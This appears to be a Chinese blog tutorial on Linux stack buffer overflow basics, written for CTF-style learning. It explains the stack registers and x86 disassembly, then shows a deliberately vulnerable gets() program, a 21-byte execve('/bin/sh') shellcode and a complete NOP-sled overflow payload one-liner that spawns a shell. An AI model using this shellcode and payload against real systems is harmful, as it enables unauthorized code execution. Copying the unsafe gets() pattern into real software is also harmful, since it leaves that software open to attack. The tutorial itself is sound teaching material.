---
title: Linux缓冲区溢出基础
categories: Linux缓冲区溢出
copyright: true
date: 2019-05-21 16:06:11
tags:
- Linux缓冲区溢出
---
# 什么是缓冲区溢出？
> 我们知道，缓冲区就是暂时放置数据的地方，也就是说缓冲区其实就是变量，在程序开发中为了增加用户体验，往往需要用户输入，而用户的输入是不可控的，如果我们在程序中设定的缓冲区大小为32字节，那么用户输入超过32字节会怎么样呢？这样就会引发一个缓冲区溢出。通过溢出缓冲区可以控制栈中的ebp、eip等，这样就可以让目标系统实现特定的功能，拿到shell。这就是缓冲区溢出。

<!--more-->

# 如何实现缓冲区溢出？
> 要实现缓冲区溢出，我们首先要有栈、汇编语言、寄存器等基础

![栈结构](/images/img/缓冲区溢出/zhan.jpg)

- esp：栈顶指针，也叫栈指针
- ebp：栈底指针
- eip：返回地址指针




#### 下面用一个例子来解释汇编语言
- C语言代码如下

```
int swap(int *xp, int *yp){
    int x = *xp;
    int y = *yp;

    *yp = x;
    *xp = y;
    return x + y;
}

int main(void){
    int x = 1;
    int y = 2;
    int sum = swap(&x, &y);
    return 0;
}
```

##### 下面是反汇编之后的汇编代码

- swap函数

```
00000000 <_swap>:
   0:   55                      push   %ebp
   1:   89 e5                   mov    %esp,%ebp  //保存ebp的值并设置帧指针
   3:   83 ec 10                sub    $0x10,%esp //栈分配了10个字节空间
   6:   8b 45 08                mov    0x8(%ebp),%eax //在当前的帧指针向上8个字节，也就是1的地址，即第一个参数 
   9:   8b 00                   mov    (%eax),%eax //将1的值存储在eax寄存器中
   b:   89 45 fc                mov    %eax,-0x4(%ebp) //1的值储存在帧指针向下的4个字节，帧指针的基地址还存储着旧的ebp值
   e:   8b 45 0c                mov    0xc(%ebp),%eax //帧指针向上12个字的地址，即第二个参数，也就是2的地址
  11:   8b 00                   mov    (%eax),%eax   //将2的值存储在eax寄存器中
  13:   89 45 f8                mov    %eax,-0x8(%ebp) //2的值存储在帧指针向下的8个字节
  16:   8b 45 0c                mov    0xc(%ebp),%eax //2的地址值存储在eax寄存器中
  19:   8b 55 fc                mov    -0x4(%ebp),%edx //1的值存储在edx寄存器
  1c:   89 10                   mov    %edx,(%eax) //将1的值覆盖eax寄存器中2的地址所指向的值，注意这里是存储器取值，所以改写的是值
  1e:   8b 45 08                mov    0x8(%ebp),%eax //1的地址值存储在eax寄存器中
  21:   8b 55 f8                mov    -0x8(%ebp),%edx //2的值储存在edu寄存器中
  24:   89 10                   mov    %edx,(%eax) //将2的值覆盖eax寄存器中1的地址所指向的值
  26:   8b 45 f8                mov    -0x8(%ebp),%eax //2的值转移到eax寄存器中
  29:   8b 55 fc                mov    -0x4(%ebp),%edx //1的值转移到edx寄存器中
  2c:   01 d0                   add    %edx,%eax
//注解④
  2e:   c9                      leave  
  2f:   c3                      ret    
```

- main函数

```
00000030 <_main>:
  30:   55                      push   %ebp //帧指针入栈，保存先前的%ebp的值
  31:   89 e5                   mov    %esp,%ebp //栈指针存放的地址值设置为帧指针存放的地址值，注解①
  33:   83 e4 f0                and    $0xfffffff0,%esp  //栈指针的地址值的最后一位设置为0
  36:   83 ec 20                sub    $0x20,%esp //栈分配20字节的空间，注解②
  39:   e8 00 00 00 00          call   3e <_main+0xe> //跳转到地址为3e的指令，也就是下一条指令
  3e:   c7 44 24 18 01 00 00    movl   $0x1,0x18(%esp) //从栈指针的地址向上18个字节开始，存储4个字节的int值， 即18 ~ 22为1的存储地址，这里超过了20，但是因为之前有一条call指令push了返回地址所以实际是分配了24个字节
  45:   00 
  46:   c7 44 24 14 02 00 00    movl   $0x2,0x14(%esp) //同上， 14 ~ 18 是2的存储地址
  4d:   00 
  4e:   8d 44 24 14             lea    0x14(%esp),%eax //将2的地址赋给%eax寄存器
  52:   89 44 24 04             mov    %eax,0x4(%esp)  //2的地址存储在栈指针向上的4个字节开始，指针为4个字节
  56:   8d 44 24 18             lea    0x18(%esp),%eax //同上，1的地址赋给%eax寄存器
  5a:   89 04 24                mov    %eax,(%esp) //1的地址直接存储在栈指针上面，注解③
  5d:   e8 9e ff ff ff          call   0 <_swap> //调用swap函数
  62:   89 44 24 1c             mov    %eax,0x1c(%esp)
  66:   b8 00 00 00 00          mov    $0x0,%eax
  6b:   c9                      leave  
  6c:   c3                      ret    
  6d:   90                      nop
  6e:   90                      nop
  6f:   90                      nop
```



详情参考此文章：[CSAPP之栈帧结构理解](https://blog.csdn.net/laughing2333/article/details/51038573?tdsourcetag=s_pctim_aiomsg "CSAPP之栈帧结构理解")


#### 通过以上的学习，我们就能初步的看懂一些简单的汇编语言了，那么道理如何让缓冲区溢出，并且达到自己想要的目的呢？
> 我们知道eip是返回地址，也就是说它是程序下一跳的地址，那么我们就可以得出结论：通过缓冲区溢出，覆盖掉eip，这样就可以实现控制eip返回地址了，既然下一跳的地址都被我们控制了，那不是我们想让程序怎么执行就怎么执行了吗？

### 下面我们通过实验来讲解
- C语言程序如下

```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}


```

##### 分析次程序可知，永远都不可能执行system命令的，但是我们可以通过缓冲区溢出来实现，具体的实现方法有很多种
- 覆盖func形参为0xcafebabe
```
eip随意 + 填充4字节 + 参数1地址（0xcafebabe）
```
- 直接调用system拿shell
```
system地址（eip） + 执行完system后下一跳 + system参数1（/bin/sh）
```
- 找出当前esp地址（eip后面就是esp）
```
esp地址（下一跳eip） + nop滑板（“\x90”） + shellcode（相当于system那条命令的16进制代码）
```
- ··········这里就不一一例举了，当然我也是个菜鸟，知道的也不多

#### 当然根据编译时开启的防护与系统防护的不同，我们使用的方法也不同
具体请看[CTF中pwn题的搭建](https://www.jianshu.com/p/a659924515f7?tdsourcetag=s_pctim_aiomsg "CTF中pwn题的搭建")



这里给出一个简短的shellcode代码
```
"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
```

## 我们就通过找出当前esp地址来实现缓冲区溢出拿shell，这也是最基础的一种方法

#### 首先我们通过gdb反汇编程序，分析一下该程序
在gdb中输入：`disas 函数名`
![](/images/img/缓冲区溢出/main.png)

可见：首先把0xdeadbeef压栈，然后调用func方法

![](/images/img/缓冲区溢出/func.png)

分析程序可以让我们可以更快的拿到自己想要的东西，通过分析，我们可以确定之前所说的第一种溢出方案拿shell，这里就不演示了，后续的练习文章中可以看到。

#### 下面我们寻找溢出点
找溢出点比较麻烦，我们可以用python来帮助我们
```
python -c 'print("A" * 44)'
```
然后我们复制粘贴进去找溢出点

![](/images/img/缓冲区溢出/1.png)

ps：A代表41   B代表42    C代表43
这里，我们找到溢出点为44个字节，那么我们就可以确定eip的位置就在 44-48 字节

然后我们输入：`x/50x $esp`查看esp寄存器，50为查看数量
![](/images/img/缓冲区溢出/2.png)


我们可以看到43，也就是C刚好就在esp的第一个，那么接下来就可以拼接溢出代码了

```
python -c 'print("A" * 44 + p32(0xbffff080) + "\x90" * 100  + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80")'
```
为什么选esp中的0xbffff080地址作为下一跳地址呢？
答：因为\x90代表0x90，它不进行任何操作，也不结束，一直向下执行，这样它就可以作为一个滑板，滑进我们的shellcode中了，所以eip的地址只要跳到0x90之中即可。